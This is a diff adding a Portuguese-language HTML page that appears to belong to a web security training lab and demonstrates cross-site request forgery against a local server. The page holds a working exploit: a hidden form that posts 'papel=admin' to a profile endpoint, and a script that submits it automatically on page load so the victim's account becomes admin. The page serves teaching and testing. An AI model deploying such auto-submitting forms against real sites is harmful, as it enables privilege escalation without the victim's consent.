@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="pt-br"><head><meta charset="utf-8"><title>CSRF</title>
+<style>body{font-family:system-ui;background:#111;color:#eee;max-width:760px;margin:40px auto;padding:0 16px;line-height:1.6}
+button{background:#ef4444;color:#fff;border:0;padding:12px 20px;border-radius:8px;cursor:pointer}
+iframe{width:100%;height:160px;background:#fff;border:1px solid #444;margin-top:14px}code{background:#222;padding:2px 6px;border-radius:4px}</style>
+</head><body>
+  <h1>CSRF — virar admin sem consentimento <code>[WSTG-SESS-05]</code></h1>
+  <p>Este formulário faz um <code>POST</code> para <code>http://localhost:4000/api/perfil</code>
+     com <code>papel=admin</code>. Como o cookie de sessão da vítima viaja junto e não há
+     token anti-CSRF em Low/Medium, a conta é <b>promovida a admin</b>. Em High → <b>403</b>.</p>
+
+  <!-- O ataque real: um simples formulário auto-submetido -->
+  <form id="f" action="http://localhost:4000/api/perfil" method="POST" target="res">
+    <input type="hidden" name="papel" value="admin">
+  </form>
+  <button onclick="document.getElementById('f').submit()">Disparar o CSRF</button>
+  <p>Resposta do servidor (na vítima):</p>
+  <iframe name="res"></iframe>
+
+  <script>
+    // dispara automaticamente ao abrir a página (como seria num ataque real)
+    setTimeout(function () { document.getElementById('f').submit(); }, 600);
+  </script>
+</body></html>
